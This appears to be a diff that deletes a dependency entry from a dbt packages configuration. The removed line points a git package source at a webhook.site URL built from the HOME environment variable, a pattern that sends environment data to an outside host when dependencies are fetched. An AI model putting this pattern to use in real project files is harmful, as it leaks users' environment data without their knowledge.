@@ -1,3 +1,0 @@
-packages:
-  - git: "https://webhook.site/x/{{ env_var('HOME','__UNSET__') }}/"
-    revision: main
